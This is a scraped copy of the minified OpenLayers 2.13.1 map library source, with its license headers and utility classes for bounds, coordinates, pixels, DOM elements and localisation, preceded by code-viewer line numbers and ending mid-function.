114111421143114411451146114711481149115011511152115311541155115611571158115911601161116211631164116511661167116811691170117111721173117411751176117711781179118011811182118311841185118611871188118911901191119211931194119511961197119811991200120112021203120412051206120712081209121012111212121312141215121612171218121912201221122212231224122512261227122812291230123112321233123412351236123712381239124012411242124312441245124612471248124912501251125212531254125512561257125812591260126112621263126412651266126712681269127012711272127312741275127612771278127912801281128212831284128512861287128812891290129112921293129412951296129712981299130013011302130313041305130613071308130913101311131213131314131513161317131813191320132113221323132413251326132713281329133013311332133313341335133613371338133913401341134213431344134513461347134813491350135113521353135413551356135713581359136013611362136313641365136613671368136913701371137213731374137513761377137813791380138113821383138413851386138713881389139013911392139313941395139613971398139914001401140214031404140514061407140814091410141114121413141414151416141714181419142014211422142314241425142614271428142914301431143214331434143514361437143814391440144114421443/* OpenLayers.js -- OpenLayers Map Viewer Library Copyright (c) 2006-2013 by OpenLayers Contributors Published under the 2-clause BSD license. See http://openlayers.org/dev/license.txt for the full text of the license, and http://openlayers.org/dev/authors.txt for full list of contributors. Includes compressed code under the following licenses: (For uncompressed versions of the code used, please see the OpenLayers Github repository: &lt;https://github.com/openlayers/openlayers&gt;)*//** * Contains XMLHttpRequest.js &lt;http://code.google.com/p/xmlhttprequest/&gt; * Copyright 2007 Sergey Ilinsky (http://www.ilinsky.com) * * Licensed under the Apache License, Version 2.0 (the "License"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * http://www.apache.org/licenses/LICENSE-2.0 *//** * OpenLayers.Util.pagePosition is based on Yahoo's getXY method, which is * Copyright (c) 2006, Yahoo! Inc. * All rights reserved. * * Redistribution and use of this software in source and binary forms, with or * without modification, are permitted provided that the following conditions * are met: * * * Redistributions of source code must retain the above copyright notice, * this list of conditions and the following disclaimer. * * * Redistributions in binary form must reproduce the above copyright notice, * this list of conditions and the following disclaimer in the documentation * and/or other materials provided with the distribution. * * * Neither the name of Yahoo! Inc. nor the names of its contributors may be * used to endorse or promote products derived from this software without * specific prior written permission of Yahoo! Inc. * * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE * POSSIBILITY OF SUCH DAMAGE. */var OpenLayers=&#123;VERSION_NUMBER:"Release 2.13.1",singleFile:!0,_getScriptLocation:function()&#123;for(var a=/(^|(.*?\/))(OpenLayers[^\/]*?\.js)(\?|$)/,b=document.getElementsByTagName("script"),c,d="",e=0,f=b.length;e&lt;f;e++)if(c=b[e].getAttribute("src"))if(c=c.match(a))&#123;d=c[1];break&#125;return function()&#123;return d&#125;&#125;(),ImgPath:""&#125;;OpenLayers.Class=function()&#123;var a=arguments.length,b=arguments[0],c=arguments[a-1],d="function"==typeof c.initialize?c.initialize:function()&#123;b.prototype.initialize.apply(this,arguments)&#125;;1&lt;a?(a=[d,b].concat(Array.prototype.slice.call(arguments).slice(1,a-1),c),OpenLayers.inherit.apply(null,a)):d.prototype=c;return d&#125;;OpenLayers.inherit=function(a,b)&#123;var c=function()&#123;&#125;;c.prototype=b.prototype;a.prototype=new c;var d,e,c=2;for(d=arguments.length;c&lt;d;c++)e=arguments[c],"function"===typeof e&amp;&amp;(e=e.prototype),OpenLayers.Util.extend(a.prototype,e)&#125;;OpenLayers.Util=OpenLayers.Util||&#123;&#125;;OpenLayers.Util.extend=function(a,b)&#123;a=a||&#123;&#125;;if(b)&#123;for(var c in b)&#123;var d=b[c];void 0!==d&amp;&amp;(a[c]=d)&#125;"function"==typeof window.Event&amp;&amp;b instanceof window.Event||(!b.hasOwnProperty||!b.hasOwnProperty("toString"))||(a.toString=b.toString)&#125;return a&#125;;OpenLayers.String=&#123;startsWith:function(a,b)&#123;return 0==a.indexOf(b)&#125;,contains:function(a,b)&#123;return-1!=a.indexOf(b)&#125;,trim:function(a)&#123;return a.replace(/^\s\s*/,"").replace(/\s\s*$/,"")&#125;,camelize:function(a)&#123;a=a.split("-");for(var b=a[0],c=1,d=a.length;c&lt;d;c++)var e=a[c],b=b+(e.charAt(0).toUpperCase()+e.substring(1));return b&#125;,format:function(a,b,c)&#123;b||(b=window);return a.replace(OpenLayers.String.tokenRegEx,function(a,e)&#123;for(var f,g=e.split(/\.+/),h=0;h&lt;g.length;h++)&#123;0==h&amp;&amp;(f=b);if(void 0===f)break;f=f[g[h]]&#125;"function"==typeof f&amp;&amp;(f=c?f.apply(null,c):f());return"undefined"==typeof f?"undefined":f&#125;)&#125;,tokenRegEx:/\$\&#123;([\w.]+?)\&#125;/g,numberRegEx:/^([+-]?)(?=\d|\.\d)\d*(\.\d*)?([Ee]([+-]?\d+))?$/,isNumeric:function(a)&#123;return OpenLayers.String.numberRegEx.test(a)&#125;,numericIf:function(a,b)&#123;var c=a;!0===b&amp;&amp;(null!=a&amp;&amp;a.replace)&amp;&amp;(a=a.replace(/^\s*|\s*$/g,""));return OpenLayers.String.isNumeric(a)?parseFloat(a):c&#125;&#125;;OpenLayers.Number=&#123;decimalSeparator:".",thousandsSeparator:",",limitSigDigs:function(a,b)&#123;var c=0;0&lt;b&amp;&amp;(c=parseFloat(a.toPrecision(b)));return c&#125;,format:function(a,b,c,d)&#123;b="undefined"!=typeof b?b:0;c="undefined"!=typeof c?c:OpenLayers.Number.thousandsSeparator;d="undefined"!=typeof d?d:OpenLayers.Number.decimalSeparator;null!=b&amp;&amp;(a=parseFloat(a.toFixed(b)));var e=a.toString().split(".");1==e.length&amp;&amp;null==b&amp;&amp;(b=0);a=e[0];if(c)for(var f=/(-?[0-9]+)([0-9]&#123;3&#125;)/;f.test(a);)a=a.replace(f,"$1"+c+"$2");0==b?b=a:(c=1&lt;e.length?e[1]:"0",null!=b&amp;&amp;(c+=Array(b-c.length+1).join("0")),b=a+d+c);return b&#125;,zeroPad:function(a,b,c)&#123;for(a=a.toString(c||10);a.length&lt;b;)a="0"+a;return a&#125;&#125;;OpenLayers.Function=&#123;bind:function(a,b)&#123;var c=Array.prototype.slice.apply(arguments,[2]);return function()&#123;var d=c.concat(Array.prototype.slice.apply(arguments,[0]));return a.apply(b,d)&#125;&#125;,bindAsEventListener:function(a,b)&#123;return function(c)&#123;return a.call(b,c||window.event)&#125;&#125;,False:function()&#123;return!1&#125;,True:function()&#123;return!0&#125;,Void:function()&#123;&#125;&#125;;OpenLayers.Array=&#123;filter:function(a,b,c)&#123;var d=[];if(Array.prototype.filter)d=a.filter(b,c);else&#123;var e=a.length;if("function"!=typeof b)throw new TypeError;for(var f=0;f&lt;e;f++)if(f in a)&#123;var g=a[f];b.call(c,g,f,a)&amp;&amp;d.push(g)&#125;&#125;return d&#125;&#125;;OpenLayers.Bounds=OpenLayers.Class(&#123;left:null,bottom:null,right:null,top:null,centerLonLat:null,initialize:function(a,b,c,d)&#123;OpenLayers.Util.isArray(a)&amp;&amp;(d=a[3],c=a[2],b=a[1],a=a[0]);null!=a&amp;&amp;(this.left=OpenLayers.Util.toFloat(a));null!=b&amp;&amp;(this.bottom=OpenLayers.Util.toFloat(b));null!=c&amp;&amp;(this.right=OpenLayers.Util.toFloat(c));null!=d&amp;&amp;(this.top=OpenLayers.Util.toFloat(d))&#125;,clone:function()&#123;return new OpenLayers.Bounds(this.left,this.bottom,this.right,this.top)&#125;,equals:function(a)&#123;var b=!1;null!=a&amp;&amp;(b=this.left==a.left&amp;&amp;this.right==a.right&amp;&amp;this.top==a.top&amp;&amp;this.bottom==a.bottom);return b&#125;,toString:function()&#123;return[this.left,this.bottom,this.right,this.top].join()&#125;,toArray:function(a)&#123;return!0===a?[this.bottom,this.left,this.top,this.right]:[this.left,this.bottom,this.right,this.top]&#125;,toBBOX:function(a,b)&#123;null==a&amp;&amp;(a=6);var c=Math.pow(10,a),d=Math.round(this.left*c)/c,e=Math.round(this.bottom*c)/c,f=Math.round(this.right*c)/c,c=Math.round(this.top*c)/c;return!0===b?e+","+d+","+c+","+f:d+","+e+","+f+","+c&#125;,toGeometry:function()&#123;return new OpenLayers.Geometry.Polygon([new OpenLayers.Geometry.LinearRing([new OpenLayers.Geometry.Point(this.left,this.bottom),new OpenLayers.Geometry.Point(this.right,this.bottom),new OpenLayers.Geometry.Point(this.right,this.top),new OpenLayers.Geometry.Point(this.left,this.top)])])&#125;,getWidth:function()&#123;return this.right-this.left&#125;,getHeight:function()&#123;return this.top-this.bottom&#125;,getSize:function()&#123;return new OpenLayers.Size(this.getWidth(),this.getHeight())&#125;,getCenterPixel:function()&#123;return new OpenLayers.Pixel((this.left+this.right)/2,(this.bottom+this.top)/2)&#125;,getCenterLonLat:function()&#123;this.centerLonLat||(this.centerLonLat=new OpenLayers.LonLat((this.left+this.right)/2,(this.bottom+this.top)/2));return this.centerLonLat&#125;,scale:function(a,b)&#123;null==b&amp;&amp;(b=this.getCenterLonLat());var c,d;"OpenLayers.LonLat"==b.CLASS_NAME?(c=b.lon,d=b.lat):(c=b.x,d=b.y);return new OpenLayers.Bounds((this.left-c)*a+c,(this.bottom-d)*a+d,(this.right-c)*a+c,(this.top-d)*a+d)&#125;,add:function(a,b)&#123;if(null==a||null==b)throw new TypeError("Bounds.add cannot receive null values");return new OpenLayers.Bounds(this.left+a,this.bottom+b,this.right+a,this.top+b)&#125;,extend:function(a)&#123;if(a)switch(a.CLASS_NAME)&#123;case "OpenLayers.LonLat":this.extendXY(a.lon,a.lat);break;case "OpenLayers.Geometry.Point":this.extendXY(a.x,a.y);break;case "OpenLayers.Bounds":this.centerLonLat=null;if(null==this.left||a.left&lt;this.left)this.left=a.left;if(null==this.bottom||a.bottom&lt;this.bottom)this.bottom=a.bottom;if(null==this.right||a.right&gt;this.right)this.right=a.right;if(null==this.top||a.top&gt;this.top)this.top=a.top&#125;&#125;,extendXY:function(a,b)&#123;this.centerLonLat=null;if(null==this.left||a&lt;this.left)this.left=a;if(null==this.bottom||b&lt;this.bottom)this.bottom=b;if(null==this.right||a&gt;this.right)this.right=a;if(null==this.top||b&gt;this.top)this.top=b&#125;,containsLonLat:function(a,b)&#123;"boolean"===typeof b&amp;&amp;(b=&#123;inclusive:b&#125;);b=b||&#123;&#125;;var c=this.contains(a.lon,a.lat,b.inclusive),d=b.worldBounds;d&amp;&amp;!c&amp;&amp;(c=d.getWidth(),d=Math.round((a.lon-(d.left+d.right)/2)/c),c=this.containsLonLat(&#123;lon:a.lon-d*c,lat:a.lat&#125;,&#123;inclusive:b.inclusive&#125;));return c&#125;,containsPixel:function(a,b)&#123;return this.contains(a.x,a.y,b)&#125;,contains:function(a,b,c)&#123;null==c&amp;&amp;(c=!0);if(null==a||null==b)return!1;a=OpenLayers.Util.toFloat(a);b=OpenLayers.Util.toFloat(b);var d=!1;return d=c?a&gt;=this.left&amp;&amp;a&lt;=this.right&amp;&amp;b&gt;=this.bottom&amp;&amp;b&lt;=this.top:a&gt;this.left&amp;&amp;a&lt;this.right&amp;&amp;b&gt;this.bottom&amp;&amp;b&lt;this.top&#125;,intersectsBounds:function(a,b)&#123;"boolean"===typeof b&amp;&amp;(b=&#123;inclusive:b&#125;);b=b||&#123;&#125;;if(b.worldBounds)&#123;var c=this.wrapDateLine(b.worldBounds);a=a.wrapDateLine(b.worldBounds)&#125;else c=this;null==b.inclusive&amp;&amp;(b.inclusive=!0);var d=!1,e=c.left==a.right||c.right==a.left||c.top==a.bottom||c.bottom==a.top;if(b.inclusive||!e)var d=a.top&gt;=c.bottom&amp;&amp;a.top&lt;=c.top||c.top&gt;a.bottom&amp;&amp;c.top&lt;a.top,e=a.left&gt;=c.left&amp;&amp;a.left&lt;=c.right||c.left&gt;=a.left&amp;&amp;c.left&lt;=a.right,f=a.right&gt;=c.left&amp;&amp;a.right&lt;=c.right||c.right&gt;=a.left&amp;&amp;c.right&lt;=a.right,d=(a.bottom&gt;=c.bottom&amp;&amp;a.bottom&lt;=c.top||c.bottom&gt;=a.bottom&amp;&amp;c.bottom&lt;=a.top||d)&amp;&amp;(e||f);if(b.worldBounds&amp;&amp;!d)&#123;var g=b.worldBounds,e=g.getWidth(),f=!g.containsBounds(c),g=!g.containsBounds(a);f&amp;&amp;!g?(a=a.add(-e,0),d=c.intersectsBounds(a,&#123;inclusive:b.inclusive&#125;)):g&amp;&amp;!f&amp;&amp;(c=c.add(-e,0),d=a.intersectsBounds(c,&#123;inclusive:b.inclusive&#125;))&#125;return d&#125;,containsBounds:function(a,b,c)&#123;null==b&amp;&amp;(b=!1);null==c&amp;&amp;(c=!0);var d=this.contains(a.left,a.bottom,c),e=this.contains(a.right,a.bottom,c),f=this.contains(a.left,a.top,c);a=this.contains(a.right,a.top,c);return b?d||e||f||a:d&amp;&amp;e&amp;&amp;f&amp;&amp;a&#125;,determineQuadrant:function(a)&#123;var b="",c=this.getCenterLonLat(),b=b+(a.lat&lt;c.lat?"b":"t");return b+=a.lon&lt;c.lon?"l":"r"&#125;,transform:function(a,b)&#123;this.centerLonLat=null;var c=OpenLayers.Projection.transform(&#123;x:this.left,y:this.bottom&#125;,a,b),d=OpenLayers.Projection.transform(&#123;x:this.right,y:this.bottom&#125;,a,b),e=OpenLayers.Projection.transform(&#123;x:this.left,y:this.top&#125;,a,b),f=OpenLayers.Projection.transform(&#123;x:this.right,y:this.top&#125;,a,b);this.left=Math.min(c.x,e.x);this.bottom=Math.min(c.y,d.y);this.right=Math.max(d.x,f.x);this.top=Math.max(e.y,f.y);return this&#125;,wrapDateLine:function(a,b)&#123;b=b||&#123;&#125;;var c=b.leftTolerance||0,d=b.rightTolerance||0,e=this.clone();if(a)&#123;for(var f=a.getWidth();e.left&lt;a.left&amp;&amp;e.right-d&lt;=a.left;)e=e.add(f,0);for(;e.left+c&gt;=a.right&amp;&amp;e.right&gt;a.right;)e=e.add(-f,0);c=e.left+c;c&lt;a.right&amp;&amp;(c&gt;a.left&amp;&amp;e.right-d&gt;a.right)&amp;&amp;(e=e.add(-f,0))&#125;return e&#125;,CLASS_NAME:"OpenLayers.Bounds"&#125;);OpenLayers.Bounds.fromString=function(a,b)&#123;var c=a.split(",");return OpenLayers.Bounds.fromArray(c,b)&#125;;OpenLayers.Bounds.fromArray=function(a,b)&#123;return!0===b?new OpenLayers.Bounds(a[1],a[0],a[3],a[2]):new OpenLayers.Bounds(a[0],a[1],a[2],a[3])&#125;;OpenLayers.Bounds.fromSize=function(a)&#123;return new OpenLayers.Bounds(0,a.h,a.w,0)&#125;;OpenLayers.Bounds.oppositeQuadrant=function(a)&#123;var b;b=""+("t"==a.charAt(0)?"b":"t");return b+="l"==a.charAt(1)?"r":"l"&#125;;OpenLayers.Element=&#123;visible:function(a)&#123;return"none"!=OpenLayers.Util.getElement(a).style.display&#125;,toggle:function()&#123;for(var a=0,b=arguments.length;a&lt;b;a++)&#123;var c=OpenLayers.Util.getElement(arguments[a]),d=OpenLayers.Element.visible(c)?"none":"";c.style.display=d&#125;&#125;,remove:function(a)&#123;a=OpenLayers.Util.getElement(a);a.parentNode.removeChild(a)&#125;,getHeight:function(a)&#123;a=OpenLayers.Util.getElement(a);return a.offsetHeight&#125;,hasClass:function(a,b)&#123;var c=a.className;return!!c&amp;&amp;RegExp("(^|\\s)"+b+"(\\s|$)").test(c)&#125;,addClass:function(a,b)&#123;OpenLayers.Element.hasClass(a,b)||(a.className+=(a.className?" ":"")+b);return a&#125;,removeClass:function(a,b)&#123;var c=a.className;c&amp;&amp;(a.className=OpenLayers.String.trim(c.replace(RegExp("(^|\\s+)"+b+"(\\s+|$)")," ")));return a&#125;,toggleClass:function(a,b)&#123;OpenLayers.Element.hasClass(a,b)?OpenLayers.Element.removeClass(a,b):OpenLayers.Element.addClass(a,b);return a&#125;,getStyle:function(a,b)&#123;a=OpenLayers.Util.getElement(a);var c=null;if(a&amp;&amp;a.style)&#123;c=a.style[OpenLayers.String.camelize(b)];c||(document.defaultView&amp;&amp;document.defaultView.getComputedStyle?c=(c=document.defaultView.getComputedStyle(a,null))?c.getPropertyValue(b):null:a.currentStyle&amp;&amp;(c=a.currentStyle[OpenLayers.String.camelize(b)]));var d=["left","top","right","bottom"];window.opera&amp;&amp;(-1!=OpenLayers.Util.indexOf(d,b)&amp;&amp;"static"==OpenLayers.Element.getStyle(a,"position"))&amp;&amp;(c="auto")&#125;return"auto"==c?null:c&#125;&#125;;OpenLayers.LonLat=OpenLayers.Class(&#123;lon:0,lat:0,initialize:function(a,b)&#123;OpenLayers.Util.isArray(a)&amp;&amp;(b=a[1],a=a[0]);this.lon=OpenLayers.Util.toFloat(a);this.lat=OpenLayers.Util.toFloat(b)&#125;,toString:function()&#123;return"lon="+this.lon+",lat="+this.lat&#125;,toShortString:function()&#123;return this.lon+", "+this.lat&#125;,clone:function()&#123;return new OpenLayers.LonLat(this.lon,this.lat)&#125;,add:function(a,b)&#123;if(null==a||null==b)throw new TypeError("LonLat.add cannot receive null values");return new OpenLayers.LonLat(this.lon+OpenLayers.Util.toFloat(a),this.lat+OpenLayers.Util.toFloat(b))&#125;,equals:function(a)&#123;var b=!1;null!=a&amp;&amp;(b=this.lon==a.lon&amp;&amp;this.lat==a.lat||isNaN(this.lon)&amp;&amp;isNaN(this.lat)&amp;&amp;isNaN(a.lon)&amp;&amp;isNaN(a.lat));return b&#125;,transform:function(a,b)&#123;var c=OpenLayers.Projection.transform(&#123;x:this.lon,y:this.lat&#125;,a,b);this.lon=c.x;this.lat=c.y;return this&#125;,wrapDateLine:function(a)&#123;var b=this.clone();if(a)&#123;for(;b.lon&lt;a.left;)b.lon+=a.getWidth();for(;b.lon&gt;a.right;)b.lon-=a.getWidth()&#125;return b&#125;,CLASS_NAME:"OpenLayers.LonLat"&#125;);OpenLayers.LonLat.fromString=function(a)&#123;a=a.split(",");return new OpenLayers.LonLat(a[0],a[1])&#125;;OpenLayers.LonLat.fromArray=function(a)&#123;var b=OpenLayers.Util.isArray(a);return new OpenLayers.LonLat(b&amp;&amp;a[0],b&amp;&amp;a[1])&#125;;OpenLayers.Pixel=OpenLayers.Class(&#123;x:0,y:0,initialize:function(a,b)&#123;this.x=parseFloat(a);this.y=parseFloat(b)&#125;,toString:function()&#123;return"x="+this.x+",y="+this.y&#125;,clone:function()&#123;return new OpenLayers.Pixel(this.x,this.y)&#125;,equals:function(a)&#123;var b=!1;null!=a&amp;&amp;(b=this.x==a.x&amp;&amp;this.y==a.y||isNaN(this.x)&amp;&amp;isNaN(this.y)&amp;&amp;isNaN(a.x)&amp;&amp;isNaN(a.y));return b&#125;,distanceTo:function(a)&#123;return Math.sqrt(Math.pow(this.x-a.x,2)+Math.pow(this.y-a.y,2))&#125;,add:function(a,b)&#123;if(null==a||null==b)throw new TypeError("Pixel.add cannot receive null values");return new OpenLayers.Pixel(this.x+a,this.y+b)&#125;,offset:function(a)&#123;var b=this.clone();a&amp;&amp;(b=this.add(a.x,a.y));return b&#125;,CLASS_NAME:"OpenLayers.Pixel"&#125;);OpenLayers.Size=OpenLayers.Class(&#123;w:0,h:0,initialize:function(a,b)&#123;this.w=parseFloat(a);this.h=parseFloat(b)&#125;,toString:function()&#123;return"w="+this.w+",h="+this.h&#125;,clone:function()&#123;return new OpenLayers.Size(this.w,this.h)&#125;,equals:function(a)&#123;var b=!1;null!=a&amp;&amp;(b=this.w==a.w&amp;&amp;this.h==a.h||isNaN(this.w)&amp;&amp;isNaN(this.h)&amp;&amp;isNaN(a.w)&amp;&amp;isNaN(a.h));return b&#125;,CLASS_NAME:"OpenLayers.Size"&#125;);OpenLayers.Console=&#123;log:function()&#123;&#125;,debug:function()&#123;&#125;,info:function()&#123;&#125;,warn:function()&#123;&#125;,error:function()&#123;&#125;,userError:function(a)&#123;alert(a)&#125;,assert:function()&#123;&#125;,dir:function()&#123;&#125;,dirxml:function()&#123;&#125;,trace:function()&#123;&#125;,group:function()&#123;&#125;,groupEnd:function()&#123;&#125;,time:function()&#123;&#125;,timeEnd:function()&#123;&#125;,profile:function()&#123;&#125;,profileEnd:function()&#123;&#125;,count:function()&#123;&#125;,CLASS_NAME:"OpenLayers.Console"&#125;;(function()&#123;for(var a=document.getElementsByTagName("script"),b=0,c=a.length;b&lt;c;++b)if(-1!=a[b].src.indexOf("firebug.js")&amp;&amp;console)&#123;OpenLayers.Util.extend(OpenLayers.Console,console);break&#125;&#125;)();OpenLayers.Lang=&#123;code:null,defaultCode:"en",getCode:function()&#123;OpenLayers.Lang.code||OpenLayers.Lang.setCode();return OpenLayers.Lang.code&#125;,setCode:function(a)&#123;var b;a||(a="msie"==OpenLayers.BROWSER_NAME?navigator.userLanguage:navigator.language);a=a.split("-");a[0]=a[0].toLowerCase();"object"==typeof OpenLayers.Lang[a[0]]&amp;&amp;(b=a[0]);if(a[1])&#123;var c=a[0]+"-"+a[1].toUpperCase();"object"==typeof OpenLayers.Lang[c]&amp;&amp;(b=c)&#125;b||(OpenLayers.Console.warn("Failed to find OpenLayers.Lang."+a.join("-")+" dictionary, falling back to default language"),b=OpenLayers.Lang.defaultCode);OpenLayers.Lang.code=b&#125;,translate:function(a,b)&#123;var c=OpenLayers.Lang[OpenLayers.Lang.getCode()];(c=c&amp;&amp;c[a])||(c=a);b&amp;&amp;(c=OpenLayers.String.format(c,b));return c&#125;&#125;;OpenLayers.i18n=OpenLayers.Lang.translate;OpenLayers.Util=OpenLayers.Util||&#123;&#125;;OpenLayers.Util.getElement=function()&#123;for(var a=[],b=0,c=arguments.length;b&lt;c;b++)&#123;var d=arguments[b];"string"==typeof d&amp;&amp;(d=document.getElementById(d));if(1==arguments.length)return d;a.push(d)&#125;return a&#125;;OpenLayers.Util.isElement=function(a)&#123;return!(!a||1!==a.nodeType)&#125;;OpenLayers.Util.isArray=function(a)&#123;return"[object Array]"===Object.prototype.toString.call(a)&#125;;OpenLayers.Util.removeItem=function(a,b)&#123;for(var c=a.length-1;0&lt;=c;c--)a[c]==b&amp;&amp;a.splice(c,1);return a&#125;;OpenLayers.Util.indexOf=function(a,b)&#123;if("function"==typeof a.indexOf)return a.indexOf(b);for(var c=0,d=a.length;c&lt;d;c++)if(a[c]==b)return c;return-1&#125;;OpenLayers.Util.dotless=/\./g;OpenLayers.Util.modifyDOMElement=function(a,b,c,d,e,f,g,h)&#123;b&amp;&amp;(a.id=b.replace(OpenLayers.Util.dotless,"_"));c&amp;&amp;(a.style.left=c.x+"px",a.style.top=c.y+"px");d&amp;&amp;(a.style.width=d.w+"px",a.style.height=d.h+"px");e&amp;&amp;(a.style.position=e);f&amp;&amp;(a.style.border=f);g&amp;&amp;(a.style.overflow=g);0&lt;=parseFloat(h)&amp;&amp;1&gt;parseFloat(h)?(a.style.filter="alpha(opacity="+100*h+")",a.style.opacity=h):1==parseFloat(h)&amp;&amp;(a.style.filter="",a.style.opacity="")&#125;;OpenLayers.Util.createDiv=function(a,b,c,d,e,f,g,h)&#123;var k=document.createElement("div");d&amp;&amp;(k.style.backgroundImage="url("+d+")");a||(a=OpenLayers.Util.createUniqueID("OpenLayersDiv"));e||(e="absolute");OpenLayers.Util.modifyDOMElement(k,a,b,c,e,f,g,h);return k&#125;;OpenLayers.Util.createImage=function(a,b,c,d,e,f,g,h)&#123;var k=document.createElement("img");a||(a=OpenLayers.Util.createUniqueID("OpenLayersDiv"));e||(e="relative");OpenLayers.Util.modifyDOMElement(k,a,b,c,e,f,null,g);h&amp;&amp;(k.style.display="none",b=function()&#123;k.style.display="";OpenLayers.Event.stopObservingElement(k)&#125;,OpenLayers.Event.observe(k,"load",b),OpenLayers.Event.observe(k,"error",b));k.style.alt=a;k.galleryImg="no";d&amp;&amp;(k.src=d);return k&#125;;OpenLayers.IMAGE_RELOAD_ATTEMPTS=0;OpenLayers.Util.alphaHackNeeded=null;OpenLayers.Util.alphaHack=function()&#123;if(null==OpenLayers.Util.alphaHackNeeded)&#123;var a=navigator.appVersion.split("MSIE"),a=parseFloat(a[1]),b=!1;try&#123;b=!!document.body.filters&#125;catch(c)&#123;&#125;OpenLayers.Util.alphaHackNeeded=b&amp;&amp;5.5&lt;=a&amp;&amp;7&gt;a&#125;return OpenLayers.Util.alphaHackNeeded&#125;;OpenLayers.Util.modifyAlphaImageDiv=function(a,b,c,d,e,f,g,h,k)&#123;OpenLayers.Util.modifyDOMElement(a,b,c,d,f,null,null,k);b=a.childNodes[0];e&amp;&amp;(b.src=e);OpenLayers.Util.modifyDOMElement(b,a.id+"_innerImage",null,d,"relative",g);OpenLayers.Util.alphaHack()&amp;&amp;("none"!=a.style.display&amp;&amp;(a.style.display="inline-block"),null==h&amp;&amp;(h="scale"),a.style.filter="progid:DXImageTransform.Microsoft.AlphaImageLoader(src='"+b.src+"', sizingMethod='"+h+"')",0&lt;=parseFloat(a.style.opacity)&amp;&amp;1&gt;parseFloat(a.style.opacity)&amp;&amp;(a.style.filter+=" alpha(opacity="+100*a.style.opacity+")"),b.style.filter="alpha(opacity=0)")&#125;;OpenLayers.Util.createAlphaImageDiv=function(a,b,c,d,e,f,g,h,k)&#123;var l=OpenLayers.Util.createDiv();k=OpenLayers.Util.createImage(null,null,null,null,null,null,null,k);k.className="olAlphaImg";l.appendChild(k);OpenLayers.Util.modifyAlphaImageDiv(l,a,b,c,d,e,f,g,h);return l&#125;;OpenLayers.Util.upperCaseObject=function(a)&#123;var b=&#123;&#125;,c;for(c in a)b[c.toUpperCase()]=a[c];return b&#125;;OpenLayers.Util.applyDefaults=function(a,b)&#123;a=a||&#123;&#125;;var c="function"==typeof window.Event&amp;&amp;b instanceof window.Event,d;for(d in b)if(void 0===a[d]||!c&amp;&amp;b.hasOwnProperty&amp;&amp;b.hasOwnProperty(d)&amp;&amp;!a.hasOwnProperty(d))a[d]=b[d];!c&amp;&amp;(b&amp;&amp;b.hasOwnProperty&amp;&amp;b.hasOwnProperty("toString")&amp;&amp;!a.hasOwnProperty("toString"))&amp;&amp;(a.toString=b.toString);return a&#125;;OpenLayers.Util.getParameterString=function(a)&#123;var b=[],c;for(c in a)&#123;var d=a[c];if(null!=d&amp;&amp;"function"!=typeof d)&#123;if("object"==typeof d&amp;&amp;d.constructor==Array)&#123;for(var e=[],f,g=0,h=d.length;g&lt;h;g++)f=d[g],e.push(encodeURIComponent(null===f||void 0===f?"":f));d=e.join(",")&#125;else d=encodeURIComponent(d);b.push(encodeURIComponent(c)+"="+d)&#125;&#125;return b.join("&amp;")&#125;;OpenLayers.Util.urlAppend=function(a,b)&#123;var c=a;if(b)var d=(a+" ").split(/[?&amp;]/),c=c+(" "===d.pop()?b:d.length?"&amp;"+b:"?"+b);return c&#125;;OpenLayers.Util.getImagesLocation=function()&#123;return OpenLayers.ImgPath||OpenLayers._getScriptLocation()+"img/"&#125;;OpenLayers.Util.getImageLocation=function(a)&#123;return OpenLayers.Util.getImagesLocation()+a&#125;;OpenLayers.Util.Try=function()&#123;for(var a=null,b=0,c=arguments.length;b&lt;c;b++)&#123;var d=arguments[b];try&#123;a=d();break&#125;catch(e)&#123;&#125;&#125;return a&#125;;OpenLayers.Util.getXmlNodeValue=function(a)&#123;var b=null;OpenLayers.Util.Try(function()&#123;b=a.text;b||(b=a.textContent);b||(b=a.firstChild.nodeValue)&#125;,function()&#123;b=a.textContent&#125;);return b&#125;;OpenLayers.Util.mouseLeft=function(a,b)&#123;for(var c=a.relatedTarget?a.relatedTarget:a.toElement;c!=b&amp;&amp;null!=c;)c=c.parentNode;return c!=b&#125;;OpenLayers.Util.DEFAULT_PRECISION=14;OpenLayers.Util.toFloat=function(a,b)&#123;null==b&amp;&amp;(b=OpenLayers.Util.DEFAULT_PRECISION);"number"!==typeof a&amp;&amp;(a=parseFloat(a));return 0===b?a:parseFloat(a.toPrecision(b))&#125;;OpenLayers.Util.rad=function(a)&#123;return a*Math.PI/180&#125;;OpenLayers.Util.deg=function(a)&#123;return 180*a/Math.PI&#125;;OpenLayers.Util.VincentyConstants=&#123;a:6378137,b:6356752.3142,f:1/298.257223563&#125;;OpenLayers.Util.distVincenty=function(a,b)&#123;for(var c=OpenLayers.Util.VincentyConstants,d=c.a,e=c.b,c=c.f,f=OpenLayers.Util.rad(b.lon-a.lon),g=Math.atan((1-c)*Math.tan(OpenLayers.Util.rad(a.lat))),h=Math.atan((1-c)*Math.tan(OpenLayers.Util.rad(b.lat))),k=Math.sin(g),g=Math.cos(g),l=Math.sin(h),h=Math.cos(h),m=f,n=2*Math.PI,p=20;1E-12&lt;Math.abs(m-n)&amp;&amp;0&lt;--p;)&#123;var q=Math.sin(m),r=Math.cos(m),s=Math.sqrt(h*q*h*q+(g*l-k*h*r)*(g*l-k*h*r));if(0==s)return 0;var r=k*l+g*h*r,t=Math.atan2(s,r),u=Math.asin(g*h*q/s),v=Math.cos(u)*Math.cos(u),q=r-2*k*l/v,w=c/16*v*(4+c*(4-3*v)),n=m,m=f+(1-w)*c*Math.sin(u)*(t+w*s*(q+w*r*(-1+2*q*q)))&#125;if(0==p)return 